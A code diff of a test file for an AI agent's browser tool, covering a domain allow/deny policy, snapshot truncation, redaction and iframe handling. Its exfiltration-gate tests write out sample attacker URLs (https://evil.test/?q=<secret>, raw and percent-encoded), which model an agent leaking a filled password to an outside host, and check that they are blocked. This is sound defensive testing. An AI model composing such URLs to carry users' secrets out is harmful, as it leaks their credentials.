@@ -1,14 +1,20 @@
-import { afterAll, afterEach, beforeEach, describe, expect, mock, test } from "bun:test";
-import { mkdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, mock, test } from "bun:test";
+import { existsSync, mkdirSync, readdirSync, rmSync, symlinkSync, utimesSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import {
   __test as browserTest,
   browserClick,
   browserConsole,
+  browserCookies,
+  browserDialog,
+  browserDownloadApproved,
   browserDrag,
   browserFillByLocator,
+  browserFillForm,
   browserHover,
   browserNavigate,
+  browserRequests,
+  browserResize,
   browserSelectOption,
   browserSnapshot,
   browserTabs,
@@ -19,17 +25,27 @@ import {
   closeAll,
   currentDisconnectGeneration,
   disconnectSharedBrowser,
+  domainPolicyBlockReason,
   hostnameIsLoopback,
   redactSecretValuesFromString,
   safetyCheck,
+  sanitizeDownloadFilename,
   setBrowserInstance,
+  setBrowserRecording,
   withTeardownLock
 } from "./browser";
 import { dispatchToolCall } from "../execution/tool-dispatch";
 import { resolveSetupRequest } from "../agent";
 import { completeBrowserConnectSetup } from "../capabilities/browser-connect";
-import { clearEchoVisionResponses, setEchoVisionResponse } from "../provider";
-import { createTask, mutateState, readState, upsertTask } from "../state";
+import {
+  clearEchoAuxTextResponses,
+  clearEchoVisionResponses,
+  getEchoAuxTextRequests,
+  setEchoAuxTextFailure,
+  setEchoAuxTextResponse,
+  setEchoVisionResponse
+} from "../provider";
+import { createAgentRecord, createTask, mutateState, readState, upsertTask } from "../state";
 import type { RuntimeConfig } from "../types";
 
 // Direct unit coverage for the URL safety guard. We exercise the function
@@ -171,6 +187,231 @@ describe("browser safetyCheck", () => {
       expect(result!.startsWith("Blocked:")).toBe(true);
       expect(result).toContain("loopback");
     }
+  });
+});
+
+// Outbound exfiltration gate: redaction scrubs registered secrets from
+// everything the model READS, but the model can still compose a navigation
+// URL that carries a filled value OUT to an attacker host
+// (https://evil.test/?q=<secret>). safetyCheck refuses such URLs — raw or
+// percent-encoded — with a generic message that never echoes the value.
+describe("browser safetyCheck registered-secret URL gate", () => {
+  const taskId = "task-secret-url-gate";
+  const secret = "hunter2-correct-horse";
+
+  afterEach(() => {
+    browserTest.resetFilledSecretsForTest();
+  });
+
+  test("blocks a URL embedding a registered secret verbatim", () => {
+    browserTest.recordFilledSecretForTest(taskId, secret);
+    const result = safetyCheck(`https://evil.test/?q=${secret}`);
+    expect(result).toBeDefined();
+    expect(result!.startsWith("Blocked:")).toBe(true);
+    expect(result).not.toContain(secret);
+  });
+
+  test("blocks the percent-encoded form of a registered secret", () => {
+    browserTest.recordFilledSecretForTest(taskId, secret);
+    const encoded = secret
+      .split("")
+      .map((c) => `%${c.charCodeAt(0).toString(16).padStart(2, "0")}`)
+      .join("");
+    const result = safetyCheck(`https://evil.test/?q=${encoded}`);
+    expect(result).toBeDefined();
+    expect(result!.startsWith("Blocked:")).toBe(true);
+    // Generic message: neither the raw value nor its encoded form leaks
+    // into the trace/audit row.
+    expect(result).not.toContain(secret);
+    expect(result).not.toContain(encoded);
+  });
+
+  test("secrets registered by another task still block (cross-task union)", () => {
+    // safetyCheck reads the union across every active task's registry —
+    // the shared-BrowserContext architecture means a secret typed by one
+    // task can surface in another task's composed URL.
+    browserTest.recordFilledSecretForTest("some-other-task", secret);
+    expect(safetyCheck(`https://evil.test/?q=${secret}`)).toBeDefined();
+  });
+
+  test("values below the redaction floor do not block", () => {
+    // Mirrors recordFilledSecret's floor: a tiny value substring-matches
+    // structural URL bytes and would false-positive on ordinary URLs.
+    browserTest.recordFilledSecretForTest(taskId, "abc");
+    expect(safetyCheck("https://example.com/?q=abc")).toBeUndefined();
+  });
+
+  test("unrelated URLs still pass while secrets are registered", () => {
+    browserTest.recordFilledSecretForTest(taskId, secret);
+    expect(safetyCheck("https://example.com/")).toBeUndefined();
+  });
+
+  test("browser_navigate fails closed pre-flight without echoing the value", async () => {
+    browserTest.recordFilledSecretForTest(taskId, secret);
+    const raw = await browserNavigate(taskId, { url: `https://evil.test/?q=${secret}` });
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(raw).not.toContain(secret);
+  });
+});
+
+// Matching semantics for the per-agent browsing boundary. Pure-function
+// coverage; enforcement plumbing is covered in the describe below. See
+// ADR browser-domain-policy.md.
+describe("browser domainPolicyBlockReason", () => {
+  test("no policy or empty lists allow everything", () => {
+    expect(domainPolicyBlockReason("https://example.com/", undefined)).toBeUndefined();
+    expect(domainPolicyBlockReason("https://example.com/", {})).toBeUndefined();
+    expect(domainPolicyBlockReason("https://example.com/", { deny: [], allow: [] })).toBeUndefined();
+  });
+
+  test("deny matches the exact host and subdomains, case-insensitively", () => {
+    const policy = { deny: ["Tracker.Evil"] };
+    for (const url of [
+      "https://tracker.evil/",
+      "https://TRACKER.EVIL/path",
+      "https://sub.tracker.evil/",
+      "https://deep.sub.tracker.evil/"
+    ]) {
+      const result = domainPolicyBlockReason(url, policy);
+      expect(result).toBeDefined();
+      expect(result).toContain("domain policy");
+    }
+  });
+
+  test("deny is suffix-on-domain-boundary, not substring", () => {
+    const policy = { deny: ["example.com"] };
+    // notexample.com merely ends with the same bytes — no dot boundary.
+    expect(domainPolicyBlockReason("https://notexample.com/", policy)).toBeUndefined();
+    expect(domainPolicyBlockReason("https://example.com.attacker.net/", policy)).toBeUndefined();
+  });
+
+  test("non-empty allow switches to allow-only mode", () => {
+    const policy = { allow: ["example.com"] };
+    expect(domainPolicyBlockReason("https://example.com/", policy)).toBeUndefined();
+    expect(domainPolicyBlockReason("https://docs.example.com/", policy)).toBeUndefined();
+    const blocked = domainPolicyBlockReason("https://other.test/", policy);
+    expect(blocked).toBeDefined();
+    expect(blocked).toContain("other.test");
+    expect(blocked).toContain("allow-only");
+  });
+
+  test("deny beats allow when a host matches both lists", () => {
+    const policy = { deny: ["bad.example.com"], allow: ["example.com"] };
+    expect(domainPolicyBlockReason("https://example.com/", policy)).toBeUndefined();
+    const blocked = domainPolicyBlockReason("https://bad.example.com/", policy);
+    expect(blocked).toBeDefined();
+    expect(blocked).toContain("denied");
+  });
+
+  test("unparseable URLs pass through (safetyCheck owns that refusal)", () => {
+    expect(domainPolicyBlockReason("not a url", { deny: ["example.com"] })).toBeUndefined();
+  });
+});
+
+// Enforcement plumbing: the policy is read from the task's owning agent's
+// AgentRecord.browserDomainPolicy in state, checked at navigate pre-flight
+// and at the live-page origin boundary (post-redirect re-validation).
+describe("browser domain policy enforcement", () => {
+  const ROOT = "/tmp/gini-browser-domain-policy-tests";
+  const instance = `browser-domain-policy-${process.pid}`;
+
+  // Seed an agent carrying the policy and a task owned by it, register the
+  // instance with the browser layer, and hand back the task id.
+  async function seedPolicyTask(policy: { deny?: string[]; allow?: string[] }): Promise<string> {
+    process.env["GINI_STATE_ROOT"] = ROOT;
+    rmSync(`${ROOT}/instances/${instance}`, { recursive: true, force: true });
+    setBrowserInstance(instance);
+    return mutateState(instance, (state) => {
+      const agent = createAgentRecord(state, {
+        name: "policy-agent",
+        toolsets: [],
+        messagingTargets: [],
+        browserDomainPolicy: policy
+      });
+      const task = createTask(state.instance, "domain policy test", undefined, undefined, undefined, undefined, agent.id);
+      upsertTask(state, task);
+      return task.id;
+    });
+  }
+
+  // seedPolicyTask repoints GINI_STATE_ROOT for the duration of this
+  // describe; capture the incoming value at test time (other describes set
+  // it during collection) and restore it so later tests in this file read
+  // their own roots.
+  let priorStateRoot: string | undefined;
+  beforeAll(() => {
+    priorStateRoot = process.env["GINI_STATE_ROOT"];
+  });
+
+  afterEach(() => {
+    setBrowserInstance("default");
+  });
+
+  afterAll(() => {
+    if (priorStateRoot === undefined) delete process.env["GINI_STATE_ROOT"];
+    else process.env["GINI_STATE_ROOT"] = priorStateRoot;
+    rmSync(ROOT, { recursive: true, force: true });
+  });
+
+  test("browser_navigate fails pre-flight on a denied domain, naming it", async () => {
+    const taskId = await seedPolicyTask({ deny: ["tracker.evil"] });
+    const raw = await browserNavigate(taskId, { url: "https://sub.tracker.evil/pixel" });
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("sub.tracker.evil");
+    expect(parsed.error).toContain("domain policy");
+  });
+
+  test("allow cannot override the SSRF gate (loopback stays blocked)", async () => {
+    const taskId = await seedPolicyTask({ allow: ["localhost"] });
+    const raw = await browserNavigate(taskId, { url: "http://localhost:3082/api/state" });
+    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
+    expect(parsed.success).toBe(false);
+    expect(parsed.error).toContain("loopback");
+  });
+
+  test("post-redirect re-validation bounces a page parked on a denied domain", async () => {
+    const taskId = await seedPolicyTask({ deny: ["tracker.evil"] });
+    const gotos: string[] = [];
+    const fakePage = {
+      url: () => "https://tracker.evil/landing",
+      goto: async (url: string) => {
+        gotos.push(url);
+        return null;
+      }
+    } as unknown as Parameters<typeof browserTest.disallowedOriginReasonForTest>[0];
+    const reason = await browserTest.disallowedOriginReasonForTest(fakePage, taskId);
+    expect(reason).toBeDefined();
+    expect(reason).toContain("tracker.evil");
+    expect(reason).toContain("domain policy");
+    expect(gotos).toEqual(["about:blank"]);
+  });
+
+  test("a page on a non-denied domain passes the origin boundary", async () => {
+    const taskId = await seedPolicyTask({ deny: ["tracker.evil"] });
+    const fakePage = {
+      url: () => "https://example.com/",
+      goto: async () => null
+    } as unknown as Parameters<typeof browserTest.disallowedOriginReasonForTest>[0];
+    expect(await browserTest.disallowedOriginReasonForTest(fakePage, taskId)).toBeUndefined();
+  });
+
+  test("tasks with no owning agent have no domain policy", async () => {
+    await seedPolicyTask({ deny: ["tracker.evil"] });
+    // A second task in the same state with NO agentId: the deny list above
+    // belongs to a different agent and must not bleed onto it.
+    const orphanTaskId = await mutateState(instance, (state) => {
+      const task = createTask(state.instance, "no agent", undefined, undefined, undefined, undefined);
+      upsertTask(state, task);
+      return task.id;
+    });
+    setBrowserInstance(instance);
+    const fakePage = {
+      url: () => "https://tracker.evil/landing",
+      goto: async () => null
+    } as unknown as Parameters<typeof browserTest.disallowedOriginReasonForTest>[0];
+    expect(await browserTest.disallowedOriginReasonForTest(fakePage, orphanTaskId)).toBeUndefined();
   });
 });
 
@@ -713,7 +954,17 @@ type WalkerFakeEl = {
   _textContent: string;
   _visible: boolean;
   _cursor: string;
+  // Planted by iframe tests onto IFRAME fakes: a fake frame document
+  // ({ body, location, querySelectorAll }) for same-origin frames, or a
+  // throwing getter (via Object.defineProperty) for cross-origin ones.
+  contentDocument?: unknown;
   parentElement: WalkerFakeEl | null;
+  // Direct child text nodes the prose-text walker reads (Node.TEXT_NODE
+  // === 3). Synthesized from the `directText` init field; element
+  // children live under `children`, not here, so the walker's direct-text
+  // read never picks them up. Absent unless a test opts in, so existing
+  // walker tests stay byte-identical.
+  childNodes?: Array<{ nodeType: number; textContent: string }>;
   getAttribute(name: string): string | null;
   setAttribute(name: string, value: string): void;
   removeAttribute(name: string): void;
@@ -734,6 +985,7 @@ const makeWalkerEl = (init: {
   cursor?: string;
   children?: WalkerFakeEl[];
   textContent?: string;
+  directText?: string;
   attrs?: Record<string, string>;
 }): WalkerFakeEl => {
   const visible = init.visible ?? true;
@@ -752,6 +1004,9 @@ const makeWalkerEl = (init: {
     _visible: visible,
     _cursor: init.cursor ?? "auto",
     parentElement: null,
+    ...(init.directText !== undefined
+      ? { childNodes: [{ nodeType: 3, textContent: init.directText }] }
+      : {}),
     getAttribute(name: string) {
       return Object.prototype.hasOwnProperty.call(this._attrs, name) ? this._attrs[name]! : null;
     },
@@ -775,6 +1030,8 @@ const makeWalkerEl = (init: {
       const recurse = (node: WalkerFakeEl) => {
         if (selector === "option") {
           if (node.tagName === "OPTION") matches.push(node);
+        } else if (selector === "iframe") {
+          if (node.tagName === "IFRAME") matches.push(node);
         } else if (selector.startsWith("[") && selector.endsWith("]")) {
           const attr = selector.slice(1, -1);
           if (Object.prototype.hasOwnProperty.call(node._attrs, attr)) matches.push(node);
@@ -916,7 +1173,7 @@ describe("snapshot walker — hidden interactive elements", () => {
     }
   });
 
-  test("caps hidden entries at 50 and appends [...hidden truncated] marker", async () => {
+  test("caps hidden entries at 50 and appends counted [...hidden truncated] marker", async () => {
     const hiddenChildren: FakeEl[] = [];
     for (let i = 0; i < 100; i++) {
       // Each child is a hidden <button> — interactive but offsetParent-less
@@ -930,9 +1187,11 @@ describe("snapshot walker — hidden interactive elements", () => {
       const result = await browserTest.snapshotForTest(page, false);
       const hiddenLines = result.text.split("\n").filter((line) => line.includes("[hidden]"));
       expect(hiddenLines.length).toBeLessThanOrEqual(50);
-      // We planted 100, so cap must have engaged.
+      // We planted 100, so cap must have engaged. The marker carries the
+      // omitted count (100 planted - 50 emitted) so the model can tell how
+      // much is left.
       expect(hiddenLines.length).toBe(50);
-      expect(result.text).toContain("[...hidden truncated]");
+      expect(result.text).toContain("[...hidden truncated +50 more hidden]");
     } finally {
       restore();
     }
@@ -1050,7 +1309,7 @@ describe("snapshot walker — cursor-interactive clickables", () => {
     }
   });
 
-  test("caps clickable emissions at 75 and appends [...clickable truncated] marker", async () => {
+  test("caps clickable emissions at 75 and appends counted [...clickable truncated] marker", async () => {
     const children: FakeEl[] = [];
     for (let i = 0; i < 80; i++) {
       // onclick (not cursor) so ancestor dedupe can't interfere with the count.
@@ -1062,7 +1321,677 @@ describe("snapshot walker — cursor-interactive clickables", () => {
       const result = await browserTest.snapshotForTest(makeFakePage(), false);
       const clickableLines = result.text.split("\n").filter((line) => line.includes(" clickable "));
       expect(clickableLines.length).toBe(75);
-      expect(result.text).toContain("[...clickable truncated]");
+      // Marker carries the omitted count (80 planted - 75 emitted).
+      expect(result.text).toContain("[...clickable truncated +5 more clickables]");
+    } finally {
+      restore();
+    }
+  });
+});
+
+// Char-budget truncation: when the assembled snapshot lines exceed
+// SNAPSHOT_CHAR_BUDGET, the [...truncated] marker carries the count of
+// entries that never made it into the text, so the model can weigh
+// scrolling on against stopping.
+// Prose-text emission (FULL mode only). The accessibility walk drops
+// plain text containers (comment bodies, article paragraphs) because they
+// carry no interactive role; the full-mode prose branch emits ONE "text"
+// row per leaf prose container, reading its DIRECT text nodes (not the
+// recursive textContent that would re-emit nested controls' names). Diff
+// (full=false) walks never run the branch, so post-action snapshots stay
+// noise-free.
+describe("snapshot walker — prose text rows", () => {
+  const makeEl = makeWalkerEl;
+  const installFakeDom = installWalkerDom;
+  const makeFakePage = (): import("playwright-core").Page =>
+    ({
+      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
+      locator: (sel: string) => ({ __sel: sel } as unknown)
+    } as unknown as import("playwright-core").Page);
+
+  afterEach(() => {
+    browserTest.resetFilledSecretsForTest();
+  });
+
+  test("full mode emits a text row for a prose container; inline link still emits its own row, no duplication", async () => {
+    // <div class="commtext">  ← prose container, no role
+    //   "This is a great point about "  ← direct text node
+    //   <a href="...">the article</a>   ← inline child, own link row
+    //   " and I agree."                  ← direct text node
+    // </div>
+    const link = makeEl({ tagName: "A", textContent: "the article", attrs: { href: "https://example.com/a" } });
+    const commtext = makeEl({
+      tagName: "DIV",
+      directText: "This is a great point about and I agree.",
+      children: [link]
+    });
+    const body = makeEl({ tagName: "BODY", children: [commtext] });
+    const restore = installFakeDom(body);
+    try {
+      const full = await browserTest.snapshotForTest(makeFakePage(), true);
+      // The prose container's direct text is surfaced as a text row.
+      expect(full.text).toContain('text "This is a great point about and I agree."');
+      // The inline <a> still emits its own link row.
+      expect(full.text).toContain("link");
+      expect(full.text).toContain("the article");
+      // The link's name appears once (its own row), never folded into the
+      // prose row — reading direct text nodes only avoids the duplication.
+      const proseRow = full.text.split("\n").find((l) => l.includes(' text "')) ?? "";
+      expect(proseRow).not.toContain("the article");
+    } finally {
+      restore();
+    }
+  });
+
+  test("diff mode (full=false) emits NO text row", async () => {
+    const commtext = makeEl({
+      tagName: "DIV",
+      directText: "Some prose that full mode would surface."
+    });
+    const body = makeEl({ tagName: "BODY", children: [commtext] });
+    const restore = installFakeDom(body);
+    try {
+      const diff = await browserTest.snapshotForTest(makeFakePage(), false);
+      expect(diff.text).not.toContain("text \"");
+      expect(diff.text).not.toContain("Some prose");
+    } finally {
+      restore();
+    }
+  });
+
+  test("a prose container with a non-inline child element does not emit a text row", async () => {
+    // A <div> wrapping a <div> is a structural container, not a leaf prose
+    // block — its text belongs to the descendants, walked separately.
+    const inner = makeEl({ tagName: "DIV", directText: "Inner prose." });
+    const outer = makeEl({
+      tagName: "DIV",
+      directText: "Outer wrapper text.",
+      children: [inner]
+    });
+    const body = makeEl({ tagName: "BODY", children: [outer] });
+    const restore = installFakeDom(body);
+    try {
+      const full = await browserTest.snapshotForTest(makeFakePage(), true);
+      // The leaf inner div emits a text row; the structural outer does not.
+      expect(full.text).toContain('text "Inner prose."');
+      expect(full.text).not.toContain("Outer wrapper text.");
+    } finally {
+      restore();
+    }
+  });
+
+  test("a text row longer than the per-row cap is sliced", async () => {
+    const long = "z".repeat(900);
+    const commtext = makeEl({ tagName: "P", directText: long });
+    const body = makeEl({ tagName: "BODY", children: [commtext] });
+    const restore = installFakeDom(body);
+    try {
+      const full = await browserTest.snapshotForTest(makeFakePage(), true);
+      const proseRow = full.text.split("\n").find((l) => l.includes(' text "')) ?? "";
+      const m = /text "(z+)"/.exec(proseRow);
+      expect(m).not.toBeNull();
+      // SNAPSHOT_TEXT_ROW_MAX_CHARS = 400.
+      expect(m![1]!.length).toBe(400);
+    } finally {
+      restore();
+    }
+  });
+
+  test("a registered secret embedded in prose is redacted in the emitted text row", async () => {
+    const secret = "hunter2-super-secret-value";
+    browserTest.recordFilledSecretForTest("t-prose-secret", secret);
+    const commtext = makeEl({
+      tagName: "P",
+      directText: `My password is ${secret} please keep it safe.`
+    });
+    const body = makeEl({ tagName: "BODY", children: [commtext] });
+    const restore = installFakeDom(body);
+    try {
+      const full = await browserTest.snapshotForTest(makeFakePage(), true, "t-prose-secret");
+      const proseRow = full.text.split("\n").find((l) => l.includes(' text "')) ?? "";
+      expect(proseRow).toContain("[redacted]");
+      expect(full.text).not.toContain(secret);
+    } finally {
+      restore();
+    }
+  });
+
+  test("prose-heavy full-mode page rides the existing char-budget truncation path", async () => {
+    // 400 prose blocks of ~900 chars each → far past the 32k char budget;
+    // the prose rows must clip via the existing counted marker, not blow
+    // the budget. Asserts the assembled text stays bounded.
+    const children: WalkerFakeEl[] = [];
+    for (let i = 0; i < 400; i++) {
+      children.push(makeEl({ tagName: "P", directText: `block-${i}-${"y".repeat(880)}` }));
+    }
+    const body = makeEl({ tagName: "BODY", children });
+    const restore = installFakeDom(body);
+    try {
+      const full = await browserTest.snapshotForTest(makeFakePage(), true);
+      expect(full.truncated).toBe(true);
+      expect(full.text).toMatch(/\[\.\.\.truncated \+\d+ more entries\]/);
+      // The kept body (everything before the marker) stays within budget.
+      const kept = full.text.split("\n[...truncated")[0]!;
+      expect(kept.length).toBeLessThanOrEqual(32_000);
+    } finally {
+      restore();
+    }
+  });
+});
+
+describe("snapshot walker — char-budget truncation count", () => {
+  const makeEl = makeWalkerEl;
+  const installFakeDom = installWalkerDom;
+  const makeFakePage = (): import("playwright-core").Page =>
+    ({
+      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
+      locator: (sel: string) => ({ __sel: sel } as unknown)
+    } as unknown as import("playwright-core").Page);
+
+  test("[...truncated] marker reports the omitted-entry count", async () => {
+    // 400 visible buttons with ~100-char names → ~110 chars per line,
+    // well past the 32k char budget, so the walker clips mid-list.
+    const children: WalkerFakeEl[] = [];
+    for (let i = 0; i < 400; i++) {
+      children.push(makeEl({ tagName: "BUTTON", textContent: `button-${i}-${"x".repeat(90)}` }));
+    }
+    const body = makeEl({ tagName: "BODY", children });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage(), false);
+      expect(result.truncated).toBe(true);
+      const match = /\[\.\.\.truncated \+(\d+) more entries\]/.exec(result.text);
+      expect(match).not.toBeNull();
+      // Emitted lines + reported omitted count must account for every
+      // planted entry.
+      const emitted = result.text.split("\n").filter((line) => line.includes(" button ")).length;
+      expect(emitted).toBeGreaterThan(0);
+      expect(emitted + Number(match![1])).toBe(400);
+    } finally {
+      restore();
+    }
+  });
+});
+
+// Over-budget FIRST-VISIT snapshots (browser_navigate / explicit
+// browser_snapshot) summarize the clipped remainder via a bounded aux
+// model call instead of silently losing it; plain counted truncation
+// remains the fallback when no config reaches the tool or the aux call
+// fails. The aux INPUT must be redacted with the same pass as the
+// snapshot text, and post-action diff snapshots never summarize.
+describe("snapshot remainder summarization", () => {
+  const makeEl = makeWalkerEl;
+  const installFakeDom = installWalkerDom;
+  const makeFakePage = (state: { url: string; onClick?: () => void }): import("playwright-core").Page =>
+    ({
+      url: () => state.url,
+      title: async () => "Big page",
+      waitForLoadState: async () => undefined,
+      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
+      locator: (sel: string) => ({
+        __sel: sel,
+        click: async (_opts?: { timeout?: number }) => {
+          state.onClick?.();
+        }
+      })
+    } as unknown as import("playwright-core").Page);
+  const echoConfig: RuntimeConfig = {
+    instance: "test",
+    port: 7337,
+    token: "test",
+    provider: { name: "echo", model: "gini-echo-v0" },
+    workspaceRoot: "/tmp",
+    stateRoot: "/tmp/gini-aux-test",
+    logRoot: "/tmp/gini-aux-test-logs"
+  };
+  // ~110 chars per button line → `count` of them blows the 32k char
+  // budget well before the list ends.
+  const makeBigBody = (count: number, lastText?: string): WalkerFakeEl => {
+    const children: WalkerFakeEl[] = [];
+    for (let i = 0; i < count; i++) {
+      children.push(makeEl({ tagName: "BUTTON", textContent: `button-${i}-${"x".repeat(90)}` }));
+    }
+    if (lastText !== undefined) {
+      children.push(makeEl({ tagName: "BUTTON", textContent: lastText }));
+    }
+    return makeEl({ tagName: "BODY", children });
+  };
+
+  afterEach(() => {
+    browserTest.clearFakeSessionsForTest();
+    browserTest.setInFlightDisconnectsForTest(0);
+    clearEchoAuxTextResponses();
+  });
+
+  test("over-budget first visit appends kept-head + divider + aux summary; remainder fed to the aux model", async () => {
+    const restore = installFakeDom(makeBigBody(400));
+    browserTest.installFakeSessionWithPageForTest("aux-sum", makeFakePage({ url: "https://example.com/big" }));
+    setEchoAuxTextResponse({ text: "Remaining rows are more list buttons [@e350] through [@e400]." });
+    try {
+      const raw = await browserSnapshot("aux-sum", {}, echoConfig);
+      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; truncated: boolean };
+      expect(parsed.success).toBe(true);
+      expect(parsed.truncated).toBe(true);
+      // Kept head + counted marker survive unchanged.
+      expect(parsed.snapshot).toContain('[@e1] button "button-0-');
+      expect(parsed.snapshot).toContain("[...truncated +");
+      // Divider + summary (with its verbatim refs) are appended.
+      expect(parsed.snapshot).toContain("remainder summarized by aux model");
+      expect(parsed.snapshot).toContain("[@e350]");
+      // The aux model received the clipped remainder, not the head.
+      const requests = getEchoAuxTextRequests();
+      expect(requests.length).toBe(1);
+      expect(requests[0]!.user).toContain("button-399");
+      expect(requests[0]!.user).not.toContain("button-0-");
+    } finally {
+      restore();
+    }
+  });
+
+  test("aux failure falls back to plain counted truncation; no config never calls the aux model", async () => {
+    const restore = installFakeDom(makeBigBody(400));
+    try {
+      browserTest.installFakeSessionWithPageForTest("aux-fail", makeFakePage({ url: "https://example.com/big" }));
+      setEchoAuxTextFailure("aux model unavailable");
+      const failed = JSON.parse(await browserSnapshot("aux-fail", {}, echoConfig)) as { success: boolean; snapshot: string };
+      expect(failed.success).toBe(true);
+      expect(failed.snapshot).toContain("[...truncated +");
+      expect(failed.snapshot).not.toContain("remainder summarized");
+      expect(getEchoAuxTextRequests().length).toBe(1);
+
+      clearEchoAuxTextResponses();
+      browserTest.clearFakeSessionsForTest();
+      browserTest.installFakeSessionWithPageForTest("aux-none", makeFakePage({ url: "https://example.com/big" }));
+      const noConfig = JSON.parse(await browserSnapshot("aux-none", {})) as { success: boolean; snapshot: string };
+      expect(noConfig.success).toBe(true);
+      expect(noConfig.snapshot).toContain("[...truncated +");
+      expect(noConfig.snapshot).not.toContain("remainder summarized");
+      expect(getEchoAuxTextRequests().length).toBe(0);
+    } finally {
+      restore();
+    }
+  });
+
+  test("the aux model input is redacted: a registered secret in the remainder never reaches the provider", async () => {
+    const secret = "hunter2-super-secret-value";
+    const restore = installFakeDom(makeBigBody(400, `welcome back ${secret}`));
+    browserTest.installFakeSessionWithPageForTest("aux-redact", makeFakePage({ url: "https://example.com/big" }));
+    browserTest.recordFilledSecretForTest("aux-redact", secret);
+    setEchoAuxTextResponse({ text: "summary of remainder" });
+    try {
+      const raw = await browserSnapshot("aux-redact", {}, echoConfig);
+      expect(raw).not.toContain(secret);
+      const requests = getEchoAuxTextRequests();
+      expect(requests.length).toBe(1);
+      expect(requests[0]!.user).not.toContain(secret);
+      expect(requests[0]!.user).toContain("[redacted]");
+    } finally {
+      restore();
+    }
+  });
+
+  test("elementCount counts what the result carries: rendered rows only, plus the remainder when summarized", async () => {
+    const restore = installFakeDom(makeBigBody(400));
+    try {
+      // With a summary appended, every ref'd row is reachable from the
+      // result (rendered head + summarized remainder, whose refs stay
+      // registered and actionable).
+      browserTest.installFakeSessionWithPageForTest("aux-count", makeFakePage({ url: "https://example.com/big" }));
+      setEchoAuxTextResponse({ text: "summary of the rest" });
+      const summarized = JSON.parse(await browserSnapshot("aux-count", {}, echoConfig)) as {
+        snapshot: string;
+        elementCount: number;
+      };
+      expect(summarized.snapshot).toContain("remainder summarized");
+      expect(summarized.elementCount).toBe(400);
+
+      // Plain counted truncation (no config): elementCount must agree with
+      // the rendered rows and the truncation marker, not silently include
+      // clipped entries the model cannot see.
+      clearEchoAuxTextResponses();
+      browserTest.clearFakeSessionsForTest();
+      browserTest.installFakeSessionWithPageForTest("aux-count-plain", makeFakePage({ url: "https://example.com/big" }));
+      const plain = JSON.parse(await browserSnapshot("aux-count-plain", {})) as {
+        snapshot: string;
+        elementCount: number;
+      };
+      expect(plain.snapshot).not.toContain("remainder summarized");
+      const emitted = plain.snapshot.split("\n").filter((line) => line.includes(" button ")).length;
+      expect(plain.elementCount).toBe(emitted);
+      const marker = /\[\.\.\.truncated \+(\d+) more entries\]/.exec(plain.snapshot);
+      expect(emitted + Number(marker![1])).toBe(400);
+    } finally {
+      restore();
+    }
+  });
+
+  test("post-action diff snapshots never trigger summarization", async () => {
+    const body = makeBigBody(400);
+    const restore = installFakeDom(body);
+    const state: { url: string; onClick?: () => void } = { url: "https://example.com/big" };
+    state.onClick = () => {
+      const added = makeEl({ tagName: "BUTTON", textContent: "NewButton" });
+      added.parentElement = body;
+      body._children.push(added);
+    };
+    browserTest.installFakeSessionWithPageForTest("aux-diff", makeFakePage(state));
+    setEchoAuxTextResponse({ text: "should-not-be-requested" });
+    try {
+      // Baseline without config: plain truncation, no aux call.
+      await browserSnapshot("aux-diff", {});
+      const raw = await browserClick("aux-diff", { ref: "@e1" });
+      const parsed = JSON.parse(raw) as { success: boolean; snapshot: string; snapshotMode: string };
+      expect(parsed.success).toBe(true);
+      expect(parsed.snapshotMode).toBe("diff");
+      expect(parsed.snapshot).not.toContain("remainder summarized");
+      expect(getEchoAuxTextRequests().length).toBe(0);
+    } finally {
+      restore();
+    }
+  });
+});
+
+// Iframe visibility: every iframe gets a row; same-origin frames are
+// walked INLINE (shared budgets, refs resolved via page.frameLocator),
+// cross-origin frames get an opaque [cross-origin] placeholder, and a
+// same-origin frame whose document URL fails the SSRF gate keeps a
+// [blocked] placeholder with its content rows stripped host-side.
+describe("snapshot walker — iframes", () => {
+  const makeEl = makeWalkerEl;
+  const installFakeDom = installWalkerDom;
+
+  // Fake frame document: enough surface for the walker (body walk), the
+  // stamp prescan (querySelectorAll over the frame body), and the
+  // host-side URL gate (location.href).
+  const makeFrameDoc = (body: WalkerFakeEl, href: string) => ({
+    body,
+    location: { href },
+    querySelectorAll: (sel: string) => body.querySelectorAll(sel)
+  });
+
+  const makeFakePage = (opts: { frameLocator?: boolean } = {}): import("playwright-core").Page =>
+    ({
+      evaluate: <A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> => Promise.resolve(fn(arg as A)),
+      locator: (sel: string) => ({ __sel: sel } as unknown),
+      ...(opts.frameLocator
+        ? {
+            frameLocator: (frameSel: string) => ({
+              locator: (sel: string) => ({ __frame: frameSel, __sel: sel } as unknown)
+            })
+          }
+        : {})
+    } as unknown as import("playwright-core").Page);
+
+  test("walks a same-origin iframe inline: iframe row + in-frame refs chained through frameLocator", async () => {
+    const cardInput = makeEl({ tagName: "INPUT", type: "text", value: "", attrs: { "aria-label": "Card number" } });
+    const payButton = makeEl({ tagName: "BUTTON", textContent: "Pay now" });
+    const frameBody = makeEl({ tagName: "BODY", children: [cardInput, payButton] });
+    const iframe = makeEl({
+      tagName: "IFRAME",
+      attrs: { src: "https://payments.example.com/checkout", name: "checkout" }
+    });
+    iframe.contentDocument = makeFrameDoc(frameBody, "https://payments.example.com/checkout");
+    const mainButton = makeEl({ tagName: "BUTTON", textContent: "Main action" });
+    const body = makeEl({ tagName: "BODY", children: [iframe, mainButton] });
+    const restore = installFakeDom(body);
+    try {
+      const result = await browserTest.snapshotForTest(makeFakePage({ frameLocator: true }), false);
+
+      // The iframe itself gets a ref'd row labeled "name|src".
+      const frameLine = result.text.split("\n").find((line) => line.includes(" iframe "));
+      expect(frameLine).toMatch(/\[@e\d+\] iframe "checkout\|https:\/\/payments\.example\.com\/checkout"/);
